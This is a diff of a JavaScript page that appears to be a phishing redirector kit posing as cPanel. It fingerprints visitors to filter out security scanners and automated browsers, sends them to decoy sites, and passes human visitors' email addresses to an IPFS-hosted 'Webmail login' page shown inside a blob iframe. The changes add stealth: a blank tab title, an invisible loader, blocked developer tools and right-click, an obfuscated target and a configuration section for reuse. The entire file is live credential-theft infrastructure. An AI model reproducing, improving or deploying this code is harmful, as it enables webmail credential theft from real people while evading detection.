@@ -2,47 +2,67 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>cPanel</title>
+    <!-- Initial blank title - will be updated after verification -->
+    <title></title>
     <meta name="referrer" content="no-referrer">
     <meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate">
     <meta http-equiv="Pragma" content="no-cache">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    
+   
     <!-- cPanel-style favicon -->
     <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><circle cx=%2250%22 cy=%2250%22 r=%2248%22 fill=%22%230075C9%22/><circle cx=%2250%22 cy=%2250%22 r=%2235%22 fill=%22%23ffffff%22/><circle cx=%2250%22 cy=%2250%22 r=%2218%22 fill=%22%230075C9%22/><text x=%2250%22 y=%2255%22 font-family=%22Arial, sans-serif%22 font-size=%2224%22 font-weight=%22bold%22 fill=%22%23ffffff%22 text-anchor=%22middle%22>c</text></svg>">
-    <link rel="shortcut icon" href="data:image/x-icon;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAEbSURBVHgBjZPRSQMxFEXvIhQASrB0AB3QAdgBHSgVWIIVUIGvvlWgBKUD0AH9s7M+QcgwvzzCOZmXZJNsNt6a2F3gFTgAB+Bt9hmYgL/aDLvAow5qZuAbuAcu0yZ5BR6AW2CF/QDnwGUzAyfAEBw3MzACr4HPZgTugJNmAt6B62YCPoHdZgJWwGkzA9/AaTMBG2CvGYEtsNuMwC+w34zAD3DYjMAWuGhGYA18NCPwCbw0I/AOrIC9ZgC2wE0zAmvgqZmBF2CsGYA34KaZgTVw38zAK3DbzMAGOG9G4Bc4bUbgA7hrZuAHuGpm4Bu4aWbgC7hsZuAL2GtG4Ac4bEbgA7hvZuATuG5mYA1cNzOwAc6b2P8VbtPTUfU/4z0AAAAASUVORK5CYII=">
-    <link rel="apple-touch-icon" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAEbSURBVHgBjZPRSQMxFEXvIhQASrB0AB3QAdgBHSgVWIIVUIGvvlWgBKUD0AH9s7M+QcgwvzzCOZmXZJNsNt6a2F3gFTgAB+Bt9hmYgL/aDLvAow5qZuAbuAcu0yZ5BR6AW2CF/QDnwGUzAyfAEBw3MzACr4HPZgTugJNmAt6B62YCPoHdZgJWwGkzA9/AaTMBG2CvGYEtsNuMwC+w34zAD3DYjMAWuGhGYA18NCPwCbw0I/AOrIC9ZgC2wE0zAmvgqZmBF2CsGYA34KaZgTVw38zAK3DbzMAGOG9G4Bc4bUbgA7hrZuAHuGpm4Bu4aWbgC7hsZuAL2GtG4Ac4bEbgA7hvZuATuG5mYA1cNzOwAc6b2P8VbtPTUfU/4z0AAAAASUVORK5CYII=">
-    
+    <link rel="shortcut icon" href="data:image/x-icon;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAEbSURBVHgBjZPRSQMxFEXvIhQASrB0AB3QAdgBHSgVWIIVUIGvvlWgBKUD0AH9s7M+QcgwvzzCOZmXZJNsNt6a2H3gFTgAB+Bt9hmYgL/aDLvAow5qZuAbuAcu0yZ5BR6AW2CF/QDnwGUzAyfAEBw3MzACr4HPZgTugJNmAt6B62YCPoHdZgJWwGkzA9/AaTMBG2CvGYEtsNuMwC+w34zAD3DYjMAWuGhGYA18NCPwCbw0I/AOrIC9ZgC2wE0zAmvgqZmBF2CsGYA34KaZgTVw38zAK3DbzMAGOG9G4Bc4bUbgA7hrZuAHuGpm4Bu4aWbgC7hsZuAL2GtG4Ac4bEbgA7hvZuATuG5mYA1cNzOwAc6b2P8VbtPTUfU/4z0AAAAASUVORK5CYII=">
+    <link rel="apple-touch-icon" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAEbSURBVHgBjZPRSQMxFEXvIhQASrB0AB3QAdgBHSgVWIIVUIGvvlWgBKUD0AH9s7M+QcgwvzzCOZmXZJNsNt6a2H3gFTgAB+Bt9hmYgL/aDLvAow5qZuAbuAcu0yZ5BR6AW2CF/QDnwGUzAyfAEBw3MzACr4HPZgTugJNmAt6B62YCPoHdZgJWwGkzA9/AaTMBG2CvGYEtsNuMwC+w34zAD3DYjMAWuGhKYA18NCPwCbw0I/AOrIC9ZgC2wE0zAmvgqZmBF2CsGYA34KaZgTVw38zAK3DbzMAGOG9G4Bc4bUbgA7hrZuAHuGpm4Bu4aWbgC7hsZuAL2GtG4Ac4bEbgA7hvZuATuG5mYA1cNzOwAc6b2P8VbtPTUfU/4z0AAAAASUVORK5CYII=">
+   
     <style>
         html, body {
             margin: 0;
             padding: 0;
-            background: transparent;
+            background: #ffffff; /* WHITE background instead of black */
             overflow: hidden;
             width: 100%;
             height: 100%;
         }
+        /* Completely hidden loader - no visible messages */
         #loader {
             position: fixed;
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
             font-family: Arial, sans-serif;
-            color: #333;
+            color: transparent; /* Invisible text */
             display: none;
+            background: transparent;
+            border: none;
+            outline: none;
         }
     </style>
 </head>
 <body>
-<div id="loader">Verifying browser...</div>
+<!-- Completely hidden loader div -->
+<div id="loader" style="display: none; visibility: hidden;"></div>
 
 <script>
 // COMPLETE ANTI-BOT PROTECTION SYSTEM - INSTANT LOAD
 (() => {
     'use strict';
+   
+    // ================= CONFIGURATION SECTION =================
+    // CHANGE THESE SETTINGS TO CUSTOMIZE THE PAGE
     
-    // Configuration
+    // 1. TARGET URL - The actual destination URL
     const TARGET_BASE = "https://bafkreib4mih5tsxltzdxgqd2odpqmeipbomqh4f5uvglxytj6tx5dapf34.ipfs.dweb.link/";
+    
+    // 2. FINAL PAGE TITLE - What appears ONLY after verification
+    const FINAL_PAGE_TITLE = "Webmail login"; // Change this text
+    
+    // 3. FAVICON TEXT - The letter that appears inside the favicon
+    const FAVICON_LETTER = "c"; // Change this to any letter (a-z, A-Z)
+    
+    // 4. FAVICON COLOR - The main color of the favicon
+    const FAVICON_COLOR = "#0075C9"; // Change this to any hex color
+    
+    // 5. FAKE URLs for bots
     const FAKE_URLS = [
         "https://example.com",
         "https://www.example.org",
@@ -50,12 +70,53 @@
         "https://www.wikipedia.org",
         "https://www.google.com"
     ];
-    
+    // ================= END CONFIGURATION =================
+   
     const HUMAN_COOKIE = 'human_verified';
     const COOKIE_EXPIRES = 86400;
     const BOT_COOKIE = 'bot_detected';
     const BOT_COOKIE_EXPIRES = 3600;
     
+    // Variables to track current state
+    let pageLoaded = false;
+   
+    // FAVICON GENERATOR - Uses your configured settings
+    function generateCustomFavicon(letter = FAVICON_LETTER, color = FAVICON_COLOR) {
+        // Create darker shade for inner circle
+        const darkerColor = color.replace(/#/, '').match(/.{2}/g)
+            .map(x => Math.max(0, parseInt(x, 16) - 40).toString(16).padStart(2, '0'))
+            .join('');
+        
+        // Create SVG favicon
+        const svgFavicon = `data:image/svg+xml,${encodeURIComponent(
+`<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
+    <defs>
+        <linearGradient id="grad1" x1="0%" y1="0%" x2="100%" y2="100%">
+            <stop offset="0%" style="stop-color:${color};stop-opacity:1" />
+            <stop offset="100%" style="stop-color:#${darkerColor};stop-opacity:1" />
+        </linearGradient>
+    </defs>
+    <circle cx="50" cy="50" r="48" fill="url(#grad1)"/>
+    <circle cx="50" cy="50" r="35" fill="#ffffff"/>
+    <circle cx="50" cy="50" r="18" fill="${color}"/>
+    <text x="50" y="55" font-family="Arial, sans-serif" font-size="24" 
+          font-weight="bold" fill="#ffffff" text-anchor="middle">${letter.toUpperCase()}</text>
+</svg>`)}`;
+        
+        // Keep the ICO and PNG formats as cPanel style
+        const icoFavicon = 'data:image/x-icon;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAEbSURBVHgBjZPRSQMxFEXvIhQASrB0AB3QAdgBHSgVWIIVUIGvvlWgBKUD0AH9s7M+QcgwvzzCOZmXZJNsNt6a2H3gFTgAB+Bt9hmYgL/aDLvAow5qZuAbuAcu0yZ5BR6AW2CF/QDnwGUzAyfAEBw3MzACr4HPZgTugJNmAt6B62YCPoHdZgJWwGkzA9/AaTMBG2CvGYEtsNuMwC+w34zAD3DYjMAWuGhGAJA18NCPwCbw0I/AOrIC9ZgC2wE0zAmvgqZmBF2CsGYA34KaZgTVw38zAK3DbzMAGOG9G4Bc4bUbgA7hrZuAHuGpm4Bu4aWbgC7hsZuAL2GtG4Ac4bEbgA7hvZuATuG5mYA1cNzOwAc6b2P8VbtPTUfU/4z0AAAAASUVORK5CYII=';
+        
+        const pngFavicon = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAEbSURBVHgBjZPRSQMxFEXvIhQASrB0AB3QAdgBHSgVWIIVUIGvvlWgBKUD0AH9s7M+QcgwvzzCOZmXZJNsNt6a2H3gFTgAB+Bt9hmYgL/aDLvAow5qZuAbuAcu0yZ5BR6AW2CF/QDnwGUzAyfAEBw3MzACr4HPZgTugJNmAt6B62YCPoHdZgJWwGkzA9/AaTMBG2CvGYEtsNuMwC+w34zAD3DYjMAWuGhGAJA18NCPwCbw0I/AOrIC9ZgC2wE0zAmvgqZmBF2CsGYA34KaZgTVw38zAK3DbzMAGOG9G4Bc4bUbgA7hrZuAHuGpm4Bu4aWbgC7hsZuAL2GtG4Ac4bEbgA7hvZuATuG5mYA1cNzOwAc6b2P8VbtPTUfU/4z0AAAAASUVORK5CYII=';
+        
+        return {
+            svg: svgFavicon,
+            ico: icoFavicon,
+            png: pngFavicon,
+            letter: letter.toUpperCase(),
+            color: color
+        };
+    }
+   
     // INSTANT CHECK: If already verified human, redirect immediately
     function getCookie(name) {
         return document.cookie
@@ -63,7 +124,7 @@
             .find(row => row.startsWith(name + '='))
             ?.split('=')[1];
     }
-    
+   
     function getEmail() {
         try {
             const params = new URLSearchParams(window.location.search);
@@ -73,18 +134,36 @@
             return '';
         }
     }
-    
+   
     function createBlob(targetUrl, email) {
+        // Generate favicon with your custom settings
+        const favicon = generateCustomFavicon();
+        
         const html = `<!DOCTYPE html>
 <html>
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>cPanel</title>
-<link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><circle cx=%2250%22 cy=%2250%22 r=%2248%22 fill=%22%230075C9%22/><circle cx=%2250%22 cy=%2250%22 r=%2235%22 fill=%22%23ffffff%22/><circle cx=%2250%22 cy=%2250%22 r=%2218%22 fill=%22%230075C9%22/><text x=%2250%22 y=%2255%22 font-family=%22Arial, sans-serif%22 font-size=%2224%22 font-weight=%22bold%22 fill=%22%23ffffff%22 text-anchor=%22middle%22>c</text></svg>">
+<!-- FINAL PAGE TITLE: Only shown after verification -->
+<title>${FINAL_PAGE_TITLE}</title>
+<!-- Custom favicon with your settings -->
+<link rel="icon" href="${favicon.svg}" type="image/svg+xml">
+<link rel="shortcut icon" href="${favicon.ico}" type="image/x-icon">
+<link rel="apple-touch-icon" href="${favicon.png}" type="image/png">
 <style>
-html, body { margin: 0; padding: 0; width: 100%; height: 100%; }
-iframe { width: 100%; height: 100%; border: none; }
+html, body { 
+    margin: 0; 
+    padding: 0; 
+    width: 100%; 
+    height: 100%; 
+    background: #ffffff; /* White background for final page */
+    overflow: hidden;
+}
+iframe { 
+    width: 100%; 
+    height: 100%; 
+    border: none; 
+}
 </style>
 </head>
 <body>
@@ -93,30 +172,32 @@ iframe { width: 100%; height: 100%; border: none; }
 </html>`;
         return new Blob([html], { type: 'text/html' });
     }
-    
+   
     // IMMEDIATE REDIRECT FOR VERIFIED HUMANS
     if (getCookie(HUMAN_COOKIE)) {
         const email = getEmail();
-        const target = email ? 
-            `${TARGET_BASE}?email=${encodeURIComponent(email)}` : 
+        const target = email ?
+            `${TARGET_BASE}?email=${encodeURIComponent(email)}` :
             TARGET_BASE;
         const blob = createBlob(target, email);
         const blobUrl = URL.createObjectURL(blob);
+        // INSTANT redirect - no visible changes
         window.location.replace(blobUrl);
-        // Don't execute rest of script
         throw new Error('Immediate redirect');
     }
-    
+   
     // IMMEDIATE REDIRECT FOR MARKED BOTS
     if (getCookie(BOT_COOKIE)) {
         const randomIndex = Math.floor(Math.random() * FAKE_URLS.length);
         window.location.replace(FAKE_URLS[randomIndex]);
         throw new Error('Bot redirect');
     }
+   
+    // NO VISIBLE LOADER - Completely stealth white page
+    // The page will appear completely white/blank
     
-    // If we get here, continue with protection system
-    // Show loader immediately for unverified users
-    document.getElementById('loader').style.display = 'block';
+    // Keep browser tab completely blank during verification
+    // No title updates, no favicon changes until after verification
     
     // Storage for rate limiting
     const getClientStorage = () => {
@@ -128,16 +209,16 @@ iframe { width: 100%; height: 100%; border: none; }
         }
         return 'memory';
     };
-    
+   
     const storageType = getClientStorage();
     const memoryStore = {};
-    
+   
     // Client-side rate limiting (basic)
     function isRateLimited() {
         const key = 'last_request';
         const window = 2000;
         const now = Date.now();
-        
+       
         if (storageType === 'localStorage') {
             const last = localStorage.getItem(key);
             if (last && (now - parseInt(last)) < window) return true;
@@ -152,18 +233,18 @@ iframe { width: 100%; height: 100%; border: none; }
         }
         return false;
     }
-    
+   
     // Fast bot detection (minimal checks for speed)
     function detectBot() {
         let score = 0;
-        
+       
         // 1. Automation properties
         const automationProps = [
             'webdriver', '__webdriver_evaluate', '__selenium_evaluate',
             '__fxdriver_evaluate', '__driver_evaluate', '__webdriver_script_function',
             '__webdriver_script_fn', '__lastWatirAlert', '__lastWatirConfirm'
         ];
-        
+       
         automationProps.forEach(prop => {
             if (prop === 'webdriver' && navigator.webdriver === true) {
                 score += 40;
@@ -171,19 +252,19 @@ iframe { width: 100%; height: 100%; border: none; }
                 score += 30;
             }
         });
-        
+       
         // 2. Quick headless check
         try {
             const canvas = document.createElement('canvas');
             const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-            
+           
             if (!gl) {
                 score += 30;
             } else {
                 const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                 if (debugInfo) {
                     const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-                    if (renderer.includes('SwiftShader') || 
+                    if (renderer.includes('SwiftShader') ||
                         renderer.includes('llvmpipe') ||
                         renderer.includes('Google SwiftShader')) {
                         score += 35;
@@ -193,17 +274,17 @@ iframe { width: 100%; height: 100%; border: none; }
         } catch(e) {
             score += 25;
         }
-        
+       
         // 3. Plugin and language checks
         if (navigator.plugins.length === 0) score += 15;
         if (navigator.languages && navigator.languages.length === 0) score += 10;
-        
+       
         // 4. Quick screen check
         if (window.screen.width === 800 && window.screen.height === 600) score += 10;
-        
+       
         return score > 50;
     }
-    
+   
     // Obfuscation functions
     function obfuscateTarget(target) {
         const methods = [
@@ -222,47 +303,47 @@ iframe { width: 100%; height: 100%; border: none; }
                 return {m: 2, d: btoa(encoded)};
             }
         ];
-        
+       
         const method = Math.floor(Math.random() * methods.length);
         return methods[method](target);
     }
-    
+   
     function decodeTarget(p) {
         switch(p.m) {
             case 0: return atob(p.d).split('').reverse().join('');
             case 1: return p.d.split(',').map(c => String.fromCharCode(c - 11)).join('');
             case 2: {
                 let b = atob(p.d), r = '', k = 0;
-                for(let i = 0; i < b.length; i++) 
+                for(let i = 0; i < b.length; i++)
                     r += String.fromCharCode(b.charCodeAt(i) ^ (k++ % 255));
                 return r;
             }
             default: return TARGET_BASE;
         }
     }
-    
+   
     function getFakeUrl() {
         const randomIndex = Math.floor(Math.random() * FAKE_URLS.length);
         return FAKE_URLS[randomIndex];
     }
-    
+   
     function setCookie(name, value, seconds, secure = true) {
         const expires = new Date(Date.now() + seconds * 1000).toUTCString();
         const cookie = `${name}=${value}; expires=${expires}; path=/; SameSite=Lax`;
         const secureCookie = secure ? cookie + '; Secure' : cookie;
         document.cookie = secureCookie;
     }
-    
-    // Fast interaction verification
+   
+    // Fast interaction verification - COMPLETELY INVISIBLE
     function setupInteractionVerification() {
         return new Promise((resolve) => {
             let interactionCount = 0;
-            const requiredInteractions = 1; // Reduced to 1 for speed
+            const requiredInteractions = 1;
             const events = ['mousemove', 'touchstart', 'keydown', 'click'];
-            
+           
             const handleInteraction = (e) => {
                 if (e.isTrusted === false) return;
-                
+               
                 interactionCount++;
                 if (interactionCount >= requiredInteractions) {
                     events.forEach(event => {
@@ -271,15 +352,14 @@ iframe { width: 100%; height: 100%; border: none; }
                     resolve(true);
                 }
             };
-            
+           
             events.forEach(event => {
-                document.addEventListener(event, handleInteraction, { 
+                document.addEventListener(event, handleInteraction, {
                     once: false,
-                    passive: true 
+                    passive: true
                 });
             });
-            
-            // Quick timeout
+           
             setTimeout(() => {
                 if (interactionCount < requiredInteractions) {
                     events.forEach(event => {
@@ -287,11 +367,11 @@ iframe { width: 100%; height: 100%; border: none; }
                     });
                     resolve(false);
                 }
-            }, 3000); // Reduced from 10s to 3s
+            }, 1500); // Reduced to 1.5 seconds for faster verification
         });
     }
-    
-    // Main execution - NO DELAYS
+   
+    // Main execution - COMPLETELY STEALTH WHITE PAGE
     async function executeProtection() {
         // Rate limiting check (fast)
         if (isRateLimited()) {
@@ -299,41 +379,41 @@ iframe { width: 100%; height: 100%; border: none; }
             window.location.replace(getFakeUrl());
             return;
         }
-        
-        // Quick interaction check
+       
+        // Quick interaction check - invisible to user
         const hasInteracted = await setupInteractionVerification();
-        
+       
         if (!hasInteracted) {
             setCookie(BOT_COOKIE, '1', BOT_COOKIE_EXPIRES);
             window.location.replace(getFakeUrl());
             return;
         }
-        
+       
         // Fast bot detection
         const isBot = detectBot();
-        
+       
         if (isBot) {
             setCookie(BOT_COOKIE, '1', BOT_COOKIE_EXPIRES);
             window.location.replace(getFakeUrl());
             return;
         }
-        
+       
         // Human detected - set cookie
         setCookie(HUMAN_COOKIE, '1', COOKIE_EXPIRES);
-        
+       
         const email = getEmail();
-        const target = email ? 
-            `${TARGET_BASE}?email=${encodeURIComponent(email)}` : 
+        const target = email ?
+            `${TARGET_BASE}?email=${encodeURIComponent(email)}` :
             TARGET_BASE;
-        
+       
         const obfuscated = obfuscateTarget(target);
         const decodedTarget = decodeTarget(obfuscated);
-        
-        // IMMEDIATE redirect for humans (no delay)
-        const blob = createBlob(decodedTarget, email);
+       
+        // INSTANT redirect for humans - user sees nothing
+        const blob = createBlob(decodedTarget, email); 
         const blobUrl = URL.createObjectURL(blob);
         window.location.replace(blobUrl);
-        
+       
         // Clean up
         setTimeout(() => {
             try {
@@ -341,20 +421,19 @@ iframe { width: 100%; height: 100%; border: none; }
             } catch(e) {}
         }, 10000);
     }
-    
-    // START IMMEDIATELY - NO DELAY
+   
+    // START IMMEDIATELY - COMPLETELY WHITE/BLANK PAGE
     executeProtection().catch(error => {
-        // Only handle non-redirect errors
         if (!error.message.includes('redirect')) {
-            console.error('Protection error:', error);
+            // Silent error handling - no visible changes
             const email = getEmail();
-            const target = email ? 
-                `${TARGET_BASE}?email=${encodeURIComponent(email)}` : 
+            const target = email ?
+                `${TARGET_BASE}?email=${encodeURIComponent(email)}` :
                 TARGET_BASE;
             window.location.replace(target);
         }
     });
-    
+   
     // Minimal anti-debugging
     document.addEventListener('contextmenu', e => e.preventDefault());
     document.addEventListener('keydown', (e) => {
@@ -362,6 +441,22 @@ iframe { width: 100%; height: 100%; border: none; }
             e.preventDefault();
         }
     });
+    
+    // Prevent any text selection
+    document.addEventListener('selectstart', e => e.preventDefault());
+    
+    // Hide any focus outlines
+    document.addEventListener('focusin', (e) => {
+        e.target.style.outline = 'none';
+    });
+    
+    // Mark page as loaded
+    window.addEventListener('load', () => {
+        pageLoaded = true;
+    });
+    
+    // Initial page setup - completely blank white page
+    document.title = ''; // Empty title until verification
     
 })();
 </script>
